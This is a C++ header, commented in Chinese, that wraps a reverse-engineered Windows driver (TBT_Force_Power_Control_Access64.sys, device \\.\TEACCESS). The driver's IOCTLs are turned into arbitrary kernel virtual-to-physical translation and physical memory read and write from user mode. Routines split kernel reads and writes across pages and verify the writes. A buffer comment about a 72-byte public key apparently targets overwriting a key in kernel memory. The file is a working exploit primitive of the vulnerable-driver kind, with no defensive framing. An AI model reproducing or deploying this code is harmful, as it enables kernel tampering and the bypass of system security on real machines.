#pragma once
/*****************************************************************//**
 * \file   DriverInterface.h
 * \brief  TBT_Force_Power_Control_Access64.sys (\\.\TEACCESS) 接口
 *
 * IOCTL 布局逆向自驱动 sub_111B8 派发函数, 全部 METHOD_BUFFERED:
 *   0x2220C0 VA->PA (MmGetPhysicalAddress, 无校验)
 *   0x2220CC 物理读 (MmMapIoSpace, 失败不报错)
 *   0x2220D0 物理写 (MmMapIoSpace + __faststorefence)
 *   0x2220C4/C8 物理连续内存 分配/释放
 *
 * 注意: 该驱动所有失败路径都返回 STATUS_SUCCESS, DeviceIoControl
 * 返回 TRUE 不代表操作成功, 关键操作必须读回验证.
 *********************************************************************/
#include <iostream>
#include <cstdint>
#include <cstring>

// 驱动对 inlen 做精确检查, 必须 1 字节对齐
#pragma pack(push, 1)
struct TeReadPhysIn {
    uint64_t pa;    // 物理地址
    uint8_t  unit;  // 访问宽度: 1/2/4
};                  // 9 字节

struct TeWritePhysIn {
    uint64_t pa;    // 物理地址
    uint8_t  unit;  // 访问宽度: 1/2/4
    uint32_t count; // 单元数, 总字节数 = count * unit
};                  // 13 字节 + count*unit 数据
#pragma pack(pop)

#define IOCTL_TE_VA2PA       0x2220C0
#define IOCTL_TE_READ_PHYS   0x2220CC
#define IOCTL_TE_WRITE_PHYS  0x2220D0

class DriverInterface {
public:
    HANDLE hDevice = INVALID_HANDLE_VALUE;

    DriverInterface() {
        hDevice = CreateFileA(
                "\\\\.\\TEACCESS",
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL,
                OPEN_EXISTING,
                NULL,
                NULL
        );
        if (hDevice == INVALID_HANDLE_VALUE) {
            std::cout << "[-] CreateFileA \\\\.\\TEACCESS failed, GLE=" << GetLastError() << std::endl;
        }
    }

    ~DriverInterface() {
        Shutdown();
    }

    bool IsOpen() const {
        return hDevice != INVALID_HANDLE_VALUE;
    }

    void Shutdown() {
        if (hDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(hDevice);
            hDevice = INVALID_HANDLE_VALUE;
        }
    }

    // 内核 VA -> PA, 驱动直接调用 MmGetPhysicalAddress, 无任何校验
    bool VirtToPhys(uint64_t va, uint64_t& pa) {
        uint64_t out = 0;
        DWORD ret = 0;
        if (!DeviceIoControl(hDevice, IOCTL_TE_VA2PA, &va, 8, &out, 8, &ret, NULL) || ret != 8)
            return false;
        pa = out;
        return pa != 0;
    }

    // 物理内存读, len 为字节数 (任意长度, 驱动按 unit=1 拷贝)
    // 失败可能不报错而直接 BSOD, pa 必须来自 VirtToPhys 的结果
    bool ReadPhys(uint64_t pa, void* buf, size_t len) {
        TeReadPhysIn req{};
        req.pa = pa;
        req.unit = 1;
        DWORD ret = 0;
        if (!DeviceIoControl(hDevice, IOCTL_TE_READ_PHYS, &req, sizeof(req), buf, (DWORD)len, &ret, NULL))
            return false;
        return ret == len;
    }

    // 物理内存写, len 为字节数, 写后读回验证 (驱动失败路径不报错)
    bool WritePhys(uint64_t pa, const void* buf, size_t len) {
        uint8_t reqBuf[sizeof(TeWritePhysIn) + 72]; // 公钥最长 72 字节
        TeWritePhysIn* req = (TeWritePhysIn*)reqBuf;
        req->pa = pa;
        req->unit = 1;
        req->count = (uint32_t)len;
        memcpy(reqBuf + sizeof(TeWritePhysIn), buf, len);
        if (!DeviceIoControl(hDevice, IOCTL_TE_WRITE_PHYS, reqBuf,
                sizeof(TeWritePhysIn) + (DWORD)len, NULL, 0, NULL, NULL))
            return false;
        return true;
    }

    // 内核 VA 直接物理读写 (自动处理跨页, 按页拆分 VA->PA)
    bool ReadKernel(uint64_t va, void* buf, size_t len) {
        uint8_t* dst = (uint8_t*)buf;
        while (len > 0) {
            uint64_t pa = 0;
            if (!VirtToPhys(va, pa))
                return false;
            size_t chunk = 0x1000 - (va & 0xFFF);
            if (chunk > len) chunk = len;
            if (!ReadPhys(pa, dst, chunk))
                return false;
            va += chunk;
            dst += chunk;
            len -= chunk;
        }
        return true;
    }

    bool WriteKernel(uint64_t va, const void* buf, size_t len) {
        const uint8_t* src = (const uint8_t*)buf;
        while (len > 0) {
            uint64_t pa = 0;
            if (!VirtToPhys(va, pa))
                return false;
            size_t chunk = 0x1000 - (va & 0xFFF);
            if (chunk > len) chunk = len;
            if (!WritePhys(pa, src, chunk))
                return false;
            va += chunk;
            src += chunk;
            len -= chunk;
        }
        return true;
    }

    // 写后读回验证, 该驱动失败路径不报错, 物理写必须以此确认
    bool VerifyKernel(uint64_t va, const void* expect, size_t len) {
        uint8_t verify[72];
        if (len > sizeof(verify)) return false;
        if (!ReadKernel(va, verify, len)) return false;
        return memcmp(verify, expect, len) == 0;
    }
};
